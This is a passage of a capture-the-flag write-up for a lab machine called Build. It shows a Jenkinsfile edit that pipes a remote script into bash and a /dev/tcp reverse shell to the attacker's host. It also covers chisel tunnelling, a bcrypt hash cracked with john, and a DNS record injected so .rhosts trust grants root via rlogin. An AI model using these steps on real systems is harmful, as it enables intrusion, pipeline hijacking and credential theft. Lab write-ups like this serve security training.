<h3 id="Logging-into-Gitea"><a href="#Logging-into-Gitea" class="headerlink" title="Logging into Gitea"></a>Logging into Gitea</h3><p>using buildadm:Git1234!, successfully login into Gitea and may modify the <code>Jenkinsfile</code></p>
<blockquote>
<p>we now have the account of buildadm, further inspection leads to <a class="link"   href="mailto:&#97;&#100;&#x6d;&#105;&#x6e;&#x40;&#98;&#117;&#105;&#108;&#x64;&#46;&#x76;&#x6c;" >&#97;&#100;&#x6d;&#105;&#x6e;&#x40;&#98;&#117;&#105;&#108;&#x64;&#46;&#x76;&#x6c;<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>, which gives away the name of the domain.<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/vulnlab-build/account-get.png"
                      alt="account-get"
                ></p>
</blockquote>
<p>before modifying the <code>Jenkinsfile</code>, check if the Jenkins instance is listening for changes in the repository by going to Settings -&gt; Webhooks<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/vulnlab-build/verifying-webhooks.png"
                      alt="verifying-webhooks"
                ></p>
<p>clicking the link will redirect to the settings of the webhook<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/vulnlab-build/webhooks-inspection.png"
                      alt="webhooks-inspection.png"
                ><br>here, notice that the trigger event is on every push events. Meaning when there’s a commit on the repository, the gitea will make a POST request to the Jenkins instance.</p>
<h3 id="Getting-rev-shells"><a href="#Getting-rev-shells" class="headerlink" title="Getting rev shells"></a>Getting rev shells</h3><p>modify the <code>Jenkinfiles</code> and save the changes</p>
<div class="code-container" data-rel="Groovy"><figure class="iseeu highlight groovy"><table><tr><td class="code"><pre><span class="line">pipeline &#123;</span><br><span class="line">    agent any</span><br><span class="line"></span><br><span class="line">    stages &#123;</span><br><span class="line">        stage(<span class="string">&#x27;revshell&#x27;</span>) &#123;</span><br><span class="line">            steps &#123;</span><br><span class="line">                sh <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">                    curl http://10.8.5.50:8080/revshell.sh | bash</span></span><br><span class="line"><span class="string">                &#x27;&#x27;&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>setup a listener at port 9999, here I used penelope. Host the <code>revshell.sh</code> at attacker machine:</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/10.8.5.50/9999 0&gt;&amp;1</span><br></pre></td></tr></table></figure></div>
<h3 id="User-in-DOCKER"><a href="#User-in-DOCKER" class="headerlink" title="User in DOCKER"></a>User in DOCKER</h3><p>After, received a reverse shell at the listener as a root! But its a root inside a docker. So next step, docker escape</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">(.venv) muyi@mag3:~/Desktop/vulnlab/easy/Build~10.10.91.238$ penelope 9999 -i tun0</span><br><span class="line">[+] Listening <span class="keyword">for</span> reverse shells on 10.8.5.50:9999</span><br><span class="line">➤  💀 Show Payloads (p) 🏠 Main Menu (m) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)</span><br><span class="line">[+] Got reverse shell from 🐧 10.10.91.238 😍️ - Assigned SessionID &lt;1&gt;</span><br><span class="line">[+] Attempting to upgrade shell to PTY...</span><br><span class="line">[!] Python agent cannot be deployed. I need to maintain at least one basic session...</span><br><span class="line">[+] Attempting to spawn a reverse shell on 10.8.5.50:9999</span><br><span class="line">[+] Got reverse shell from 🐧 10.10.91.238 😍️ - Assigned SessionID &lt;2&gt;</span><br><span class="line">[+] Attempting to upgrade shell to PTY...</span><br><span class="line">[+] Shell upgraded successfully using /usr/bin/script! 💪</span><br><span class="line">[+] Interacting with session [2], Shell Type: PTY, Menu key: F12</span><br><span class="line">[+] Logging to /home/muyi/.penelope/10.10.91.238/10.10.91.238.<span class="built_in">log</span> 📜</span><br><span class="line"></span><br><span class="line">root@5ac6c7d6fb8e:/var/jenkins_home/workspace/build_dev_main# ^C</span><br><span class="line">root@5ac6c7d6fb8e:/var/jenkins_home/workspace/build_dev_main# <span class="built_in">ls</span></span><br><span class="line">Jenkinsfile</span><br><span class="line">root@5ac6c7d6fb8e:/var/jenkins_home/workspace/build_dev_main# <span class="built_in">ls</span> ~</span><br><span class="line">user.txt</span><br><span class="line">root@5ac6c7d6fb8e:/var/jenkins_home/workspace/build_dev_main# <span class="built_in">cat</span> ~/user.txt</span><br><span class="line">VL&#123;********&#125;</span><br></pre></td></tr></table></figure></div>

<p>from this, I know that we are inside a docker with the presence of &#x2F;.dockerenv</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">root@5ac6c7d6fb8e:~# <span class="built_in">ls</span> -a /</span><br><span class="line">.  ..  .dockerenv  bin  boot  dev  etc  home  lib  lib32  lib64  libx32  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var</span><br></pre></td></tr></table></figure></div>
<h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><h3 id="Rhosts"><a href="#Rhosts" class="headerlink" title="Rhosts"></a>Rhosts</h3><p>at the ~ directory, discovered rhost file</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">root@5ac6c7d6fb8e:~# <span class="built_in">ls</span> -la</span><br><span class="line">total 9176</span><br><span class="line">drwxr-xr-x 3 root root    4096 Jan 21 08:35 .</span><br><span class="line">drwxr-xr-x 1 root root    4096 May  9  2024 ..</span><br><span class="line">lrwxrwxrwx 1 root root       9 May  1  2024 .bash_history -&gt; /dev/null</span><br><span class="line">-r-------- 1 root root      35 May  1  2024 .rhosts</span><br><span class="line">drwxr-xr-x 2 root root    4096 May  1  2024 .ssh</span><br><span class="line">-rwxr-xr-x 1 root root 9371800 Jan 21 08:36 chisel</span><br><span class="line">-rw------- 1 root root      37 May  1  2024 user.txt</span><br><span class="line">root@5ac6c7d6fb8e:~# <span class="built_in">cat</span> .rhosts</span><br><span class="line">admin.build.vl +</span><br><span class="line">intern.build.vl +</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>for this section, refer to <a class="link"   href="https://blog.apolloteapot.com/vulnlab-build" >https://blog.apolloteapot.com/vulnlab-build<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> for further dissection of what rhost do</p>
</blockquote>
<h3 id="Docker’s-IP"><a href="#Docker’s-IP" class="headerlink" title="Docker’s IP"></a>Docker’s IP</h3><p>discovering the docker ip address [<a class="link"   href="https://blog.oddbit.com/post/2015-03-08-converting-hexadecimal-ip-addr/]" >https://blog.oddbit.com/post/2015-03-08-converting-hexadecimal-ip-addr/]<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">root@5ac6c7d6fb8e:~# hexaddr=$(awk <span class="string">&#x27;$2 == &quot;00000000&quot; &#123;print $3&#125;&#x27;</span> /proc/net/route)</span><br><span class="line">ipaddr=$(<span class="built_in">printf</span> <span class="string">&quot;%d.&quot;</span> $(</span><br><span class="line">  <span class="built_in">echo</span> <span class="variable">$hexaddr</span> | sed <span class="string">&#x27;s/../0x&amp; /g&#x27;</span> | <span class="built_in">tr</span> <span class="string">&#x27; &#x27;</span> <span class="string">&#x27;\n&#x27;</span> | <span class="built_in">tac</span></span><br><span class="line">  ) | sed <span class="string">&#x27;s/\.$/\n/&#x27;</span>)</span><br><span class="line">root@5ac6c7d6fb8e:~# <span class="built_in">echo</span> <span class="variable">$ipaddr</span></span><br><span class="line">172.18.0.1</span><br></pre></td></tr></table></figure></div>
<h3 id="Reverse-Proxy-via-Chisel"><a href="#Reverse-Proxy-via-Chisel" class="headerlink" title="Reverse Proxy via Chisel"></a>Reverse Proxy via Chisel</h3><p>Next, I would need to setup a reverse SOCKS Proxy so that I can access the internal face server as docker-root</p>
<ul>
<li>upload <code>chisel</code> into the docker via any method</li>
<li>change the permission so that it can be executed<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">muyi@mag3:~/tools/chisel$ chisel server --reverse --port 54321</span><br><span class="line">2025/01/21 16:01:22 server: Reverse tunnelling enabled</span><br><span class="line">2025/01/21 16:01:22 server: Fingerprint JTqSFjMr+ONvrQ8T0gtE2ogMYQ79Q3kkCMcPClcu5K0=</span><br><span class="line">2025/01/21 16:01:22 server: Listening on http://0.0.0.0:54321</span><br><span class="line"></span><br><span class="line">root@5ac6c7d6fb8e:~# ./chisel client 10.8.5.50:54321 R:socks</span><br><span class="line">2025/01/21 08:02:03 client: Connecting to ws://10.8.5.50:54321</span><br><span class="line">2025/01/21 08:02:06 client: Connected (Latency 204.060174ms)</span><br><span class="line"></span><br><span class="line"><span class="comment"># on /etc/proxychains4.conf, change the following line</span></span><br><span class="line">socks4   127.0.0.1 9050 --&gt; socks5   127.0.0.1 9050</span><br></pre></td></tr></table></figure></div></li>
</ul>
<p>Now, I can access as root using my attacker machine and connect to the sql service on port 3306</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">muyi@mag3:~/Desktop/vulnlab/easy/Build~10.10.91.238$ proxychains mysql -h 172.18.0.1 -u root --skip-ssl</span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line">[proxychains] Strict chain  ...  127.0.0.1:9050  ...  172.18.0.1:3306  ...  OK</span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MariaDB connection <span class="built_in">id</span> is 37</span><br><span class="line">Server version: 11.3.2-MariaDB-1:11.3.2+maria~ubu2204 mariadb.org binary distribution</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Support MariaDB developers by giving a star at https://github.com/MariaDB/server</span><br><span class="line">Type <span class="string">&#x27;help;&#x27;</span> or <span class="string">&#x27;\h&#x27;</span> <span class="keyword">for</span> <span class="built_in">help</span>. Type <span class="string">&#x27;\c&#x27;</span> to clear the current input statement.</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt;</span><br></pre></td></tr></table></figure></div>

<h3 id="MariaDB-enumeration"><a href="#MariaDB-enumeration" class="headerlink" title="MariaDB enumeration"></a>MariaDB enumeration</h3><div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">MariaDB [(<span class="keyword">none</span>)]<span class="operator">&gt;</span> <span class="keyword">show</span> databases;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> Database           <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> information_schema <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> mysql              <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> performance_schema <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> powerdnsadmin      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> sys                <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="number">5</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.199</span> sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(<span class="keyword">none</span>)]<span class="operator">&gt;</span> use powerdnsadmin;</span><br><span class="line">Reading <span class="keyword">table</span> information <span class="keyword">for</span> completion <span class="keyword">of</span> <span class="keyword">table</span> <span class="keyword">and</span> <span class="keyword">column</span> names</span><br><span class="line">You can turn off this feature <span class="keyword">to</span> <span class="keyword">get</span> a quicker startup <span class="keyword">with</span> <span class="operator">-</span>A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">MariaDB [powerdnsadmin]<span class="operator">&gt;</span> <span class="keyword">show</span> tables;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------+</span></span><br><span class="line"><span class="operator">|</span> Tables_in_powerdnsadmin <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------+</span></span><br><span class="line"><span class="operator">|</span> account                 <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> account_user            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> alembic_version         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> apikey                  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> apikey_account          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> comments                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> cryptokeys              <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> domain                  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> domain_apikey           <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> domain_setting          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> domain_template         <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> domain_template_record  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> domain_user             <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> domainmetadata          <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> domains                 <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> history                 <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> records                 <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> role                    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> sessions                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> setting                 <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> supermasters            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> tsigkeys                <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">user</span>                    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------+</span></span><br><span class="line"><span class="number">23</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.285</span> sec)</span><br><span class="line"></span><br><span class="line">MariaDB [powerdnsadmin]<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> records;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+-----------+----------------------+------+------------------------------------------------------------------------------------------+------+------+----------+-----------+------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> domain_id <span class="operator">|</span> name                 <span class="operator">|</span> type <span class="operator">|</span> content</span><br><span class="line">                    <span class="operator">|</span> ttl  <span class="operator">|</span> prio <span class="operator">|</span> disabled <span class="operator">|</span> ordername <span class="operator">|</span> auth <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+-----------+----------------------+------+------------------------------------------------------------------------------------------+------+------+----------+-----------+------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">8</span> <span class="operator">|</span>         <span class="number">1</span> <span class="operator">|</span> db.build.vl          <span class="operator">|</span> A    <span class="operator">|</span> <span class="number">172.18</span><span class="number">.0</span><span class="number">.4</span></span><br><span class="line">                    <span class="operator">|</span>   <span class="number">60</span> <span class="operator">|</span>    <span class="number">0</span> <span class="operator">|</span>        <span class="number">0</span> <span class="operator">|</span> <span class="keyword">NULL</span>      <span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">9</span> <span class="operator">|</span>         <span class="number">1</span> <span class="operator">|</span> gitea.build.vl       <span class="operator">|</span> A    <span class="operator">|</span> <span class="number">172.18</span><span class="number">.0</span><span class="number">.2</span></span><br><span class="line">                    <span class="operator">|</span>   <span class="number">60</span> <span class="operator">|</span>    <span class="number">0</span> <span class="operator">|</span>        <span class="number">0</span> <span class="operator">|</span> <span class="keyword">NULL</span>      <span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">10</span> <span class="operator">|</span>         <span class="number">1</span> <span class="operator">|</span> intern.build.vl      <span class="operator">|</span> A    <span class="operator">|</span> <span class="number">172.18</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">                    <span class="operator">|</span>   <span class="number">60</span> <span class="operator">|</span>    <span class="number">0</span> <span class="operator">|</span>        <span class="number">0</span> <span class="operator">|</span> <span class="keyword">NULL</span>      <span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">11</span> <span class="operator">|</span>         <span class="number">1</span> <span class="operator">|</span> jenkins.build.vl     <span class="operator">|</span> A    <span class="operator">|</span> <span class="number">172.18</span><span class="number">.0</span><span class="number">.3</span></span><br><span class="line">                    <span class="operator">|</span>   <span class="number">60</span> <span class="operator">|</span>    <span class="number">0</span> <span class="operator">|</span>        <span class="number">0</span> <span class="operator">|</span> <span class="keyword">NULL</span>      <span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">12</span> <span class="operator">|</span>         <span class="number">1</span> <span class="operator">|</span> pdns<span class="operator">-</span>worker.build.vl <span class="operator">|</span> A    <span class="operator">|</span> <span class="number">172.18</span><span class="number">.0</span><span class="number">.5</span></span><br><span class="line">                    <span class="operator">|</span>   <span class="number">60</span> <span class="operator">|</span>    <span class="number">0</span> <span class="operator">|</span>        <span class="number">0</span> <span class="operator">|</span> <span class="keyword">NULL</span>      <span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">13</span> <span class="operator">|</span>         <span class="number">1</span> <span class="operator">|</span> pdns.build.vl        <span class="operator">|</span> A    <span class="operator">|</span> <span class="number">172.18</span><span class="number">.0</span><span class="number">.6</span></span><br><span class="line">                    <span class="operator">|</span>   <span class="number">60</span> <span class="operator">|</span>    <span class="number">0</span> <span class="operator">|</span>        <span class="number">0</span> <span class="operator">|</span> <span class="keyword">NULL</span>      <span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">14</span> <span class="operator">|</span>         <span class="number">1</span> <span class="operator">|</span> build.vl             <span class="operator">|</span> SOA  <span class="operator">|</span> a.misconfigured.dns.server.invalid hostmaster.build.vl <span class="number">2024050201</span> <span class="number">10800</span> <span class="number">3600</span> <span class="number">604800</span> <span class="number">3600</span> <span class="operator">|</span> <span class="number">1500</span> <span class="operator">|</span>    <span class="number">0</span> <span class="operator">|</span>        <span class="number">0</span> <span class="operator">|</span> <span class="keyword">NULL</span>      <span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+-----------+----------------------+------+------------------------------------------------------------------------------------------+------+------+----------+-----------+------+</span></span><br><span class="line"><span class="number">7</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.275</span> sec)</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">MariaDB [powerdnsadmin]<span class="operator">&gt;</span> <span class="keyword">select</span> username,password,email <span class="keyword">from</span> <span class="keyword">user</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+--------------------------------------------------------------+----------------+</span></span><br><span class="line"><span class="operator">|</span> username <span class="operator">|</span> password                                                     <span class="operator">|</span> email          <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+--------------------------------------------------------------+----------------+</span></span><br><span class="line"><span class="operator">|</span> admin    <span class="operator">|</span> $<span class="number">2</span>b$<span class="number">12</span>$s1hK0o7YNkJGfu5poWx<span class="number">.0</span>u1WLqKQIgJOXWjjXz7Ze3Uw5Sc2.hsEq <span class="operator">|</span> admin<span class="variable">@build</span>.vl <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+--------------------------------------------------------------+----------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.296</span> sec)</span><br></pre></td></tr></table></figure></div>
<p>crack the password</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">muyi@mag3:~$ john <span class="built_in">hash</span> --wordlist=/usr/share/wordlists/rockyou.txt</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (bcrypt [Blowfish 32/64 X3])</span><br><span class="line">Cost 1 (iteration count) is 4096 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Will run 12 OpenMP threads</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">winston          (?)</span><br><span class="line">1g 0:00:00:17 DONE (2025-01-21 17:03) 0.05847g/s 82.10p/s 82.10c/s 82.10C/s winston..harry</span><br><span class="line">Use the <span class="string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed.</span><br></pre></td></tr></table></figure></div>


<h2 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h2><p>Exploitation [<a class="link"   href="https://cyfisher.dev/p/build/]" >https://cyfisher.dev/p/build/]<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<ul>
<li>since I have access to the MariaDB which handles the database of the PowerDNS at port 8081</li>
<li>I can straight insert the data into the table without being authenticated into the website<ul>
<li>mostly because for the entire session using proxychains, I failed to perform nmap for unknown reasons</li>
</ul>
</li>
</ul>
<div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">MariaDB [powerdnsadmin]<span class="operator">&gt;</span> <span class="keyword">INSERT INTO</span> powerdnsadmin.records (domain_id, name, type, content, ttl, prio, disabled, ordername, auth) <span class="keyword">VALUES</span> ((<span class="keyword">SELECT</span> id <span class="keyword">FROM</span> powerdnsadmin.domains <span class="keyword">WHERE</span> name <span class="operator">=</span> <span class="string">&#x27;build.vl&#x27;</span>), <span class="string">&#x27;admin.build.vl&#x27;</span>, <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;10.8.5.50&#x27;</span>, <span class="number">60</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="keyword">NULL</span>, <span class="number">1</span>);</span><br><span class="line">Query OK, <span class="number">1</span> <span class="type">row</span> affected (<span class="number">0.203</span> sec)</span><br><span class="line"></span><br><span class="line">MariaDB [powerdnsadmin]<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> records;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+-----------+----------------------+------+------------------------------------------------------------------------------------------+------+------+----------+-----------+------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> domain_id <span class="operator">|</span> name                 <span class="operator">|</span> type <span class="operator">|</span> content                                                                                  <span class="operator">|</span> ttl  <span class="operator">|</span> prio <span class="operator">|</span> disabled <span class="operator">|</span> ordername <span class="operator">|</span> auth <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+-----------+----------------------+------+------------------------------------------------------------------------------------------+------+------+----------+-----------+------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">8</span> <span class="operator">|</span>         <span class="number">1</span> <span class="operator">|</span> db.build.vl          <span class="operator">|</span> A    <span class="operator">|</span> <span class="number">172.18</span><span class="number">.0</span><span class="number">.4</span>                                                                               <span class="operator">|</span>   <span class="number">60</span> <span class="operator">|</span>    <span class="number">0</span> <span class="operator">|</span>        <span class="number">0</span> <span class="operator">|</span> <span class="keyword">NULL</span>      <span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">9</span> <span class="operator">|</span>         <span class="number">1</span> <span class="operator">|</span> gitea.build.vl       <span class="operator">|</span> A    <span class="operator">|</span> <span class="number">172.18</span><span class="number">.0</span><span class="number">.2</span>                                                                               <span class="operator">|</span>   <span class="number">60</span> <span class="operator">|</span>    <span class="number">0</span> <span class="operator">|</span>        <span class="number">0</span> <span class="operator">|</span> <span class="keyword">NULL</span>      <span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">10</span> <span class="operator">|</span>         <span class="number">1</span> <span class="operator">|</span> intern.build.vl      <span class="operator">|</span> A    <span class="operator">|</span> <span class="number">172.18</span><span class="number">.0</span><span class="number">.1</span>                                                                               <span class="operator">|</span>   <span class="number">60</span> <span class="operator">|</span>    <span class="number">0</span> <span class="operator">|</span>        <span class="number">0</span> <span class="operator">|</span> <span class="keyword">NULL</span>      <span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">11</span> <span class="operator">|</span>         <span class="number">1</span> <span class="operator">|</span> jenkins.build.vl     <span class="operator">|</span> A    <span class="operator">|</span> <span class="number">172.18</span><span class="number">.0</span><span class="number">.3</span>                                                                               <span class="operator">|</span>   <span class="number">60</span> <span class="operator">|</span>    <span class="number">0</span> <span class="operator">|</span>        <span class="number">0</span> <span class="operator">|</span> <span class="keyword">NULL</span>      <span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">12</span> <span class="operator">|</span>         <span class="number">1</span> <span class="operator">|</span> pdns<span class="operator">-</span>worker.build.vl <span class="operator">|</span> A    <span class="operator">|</span> <span class="number">172.18</span><span class="number">.0</span><span class="number">.5</span>                                                                               <span class="operator">|</span>   <span class="number">60</span> <span class="operator">|</span>    <span class="number">0</span> <span class="operator">|</span>        <span class="number">0</span> <span class="operator">|</span> <span class="keyword">NULL</span>      <span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">13</span> <span class="operator">|</span>         <span class="number">1</span> <span class="operator">|</span> pdns.build.vl        <span class="operator">|</span> A    <span class="operator">|</span> <span class="number">172.18</span><span class="number">.0</span><span class="number">.6</span>                                                                               <span class="operator">|</span>   <span class="number">60</span> <span class="operator">|</span>    <span class="number">0</span> <span class="operator">|</span>        <span class="number">0</span> <span class="operator">|</span> <span class="keyword">NULL</span>      <span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">14</span> <span class="operator">|</span>         <span class="number">1</span> <span class="operator">|</span> build.vl             <span class="operator">|</span> SOA  <span class="operator">|</span> a.misconfigured.dns.server.invalid hostmaster.build.vl <span class="number">2024050201</span> <span class="number">10800</span> <span class="number">3600</span> <span class="number">604800</span> <span class="number">3600</span> <span class="operator">|</span> <span class="number">1500</span> <span class="operator">|</span>    <span class="number">0</span> <span class="operator">|</span>        <span class="number">0</span> <span class="operator">|</span> <span class="keyword">NULL</span>      <span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">15</span> <span class="operator">|</span>         <span class="number">1</span> <span class="operator">|</span> admin.build.vl       <span class="operator">|</span> A    <span class="operator">|</span> <span class="number">10.8</span><span class="number">.5</span><span class="number">.50</span>                                                                                <span class="operator">|</span>   <span class="number">60</span> <span class="operator">|</span>    <span class="number">0</span> <span class="operator">|</span>        <span class="number">0</span> <span class="operator">|</span> <span class="keyword">NULL</span>      <span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+-----------+----------------------+------+------------------------------------------------------------------------------------------+------+------+----------+-----------+------+</span></span><br><span class="line"><span class="number">8</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.278</span> sec)</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">muyi@mag3:~$ nslookup admin.build.vl 10.10.107.157</span><br><span class="line">Server:         10.10.107.157</span><br><span class="line">Address:        10.10.107.157#53</span><br><span class="line"></span><br><span class="line">Name:   admin.build.vl</span><br><span class="line">Address: 10.8.5.50</span><br></pre></td></tr></table></figure></div>

<p>with that, I can login as root</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">muyi@mag3:~$ rlogin 10.10.107.157 -l root</span><br><span class="line">Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-105-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/pro</span><br><span class="line"></span><br><span class="line">  System information as of Tue Jan 21 09:10:04 AM UTC 2025</span><br><span class="line"></span><br><span class="line">  System load:                      0.05029296875</span><br><span class="line">  Usage of /:                       62.7% of 9.75GB</span><br><span class="line">  Memory usage:                     58%</span><br><span class="line">  Swap usage:                       0%</span><br><span class="line">  Processes:                        143</span><br><span class="line">  Users logged <span class="keyword">in</span>:                  0</span><br><span class="line">  IPv4 address <span class="keyword">for</span> br-f8002c9d7234: 172.18.0.1</span><br><span class="line">  IPv4 address <span class="keyword">for</span> docker0:         172.17.0.1</span><br><span class="line">  IPv4 address <span class="keyword">for</span> ens5:            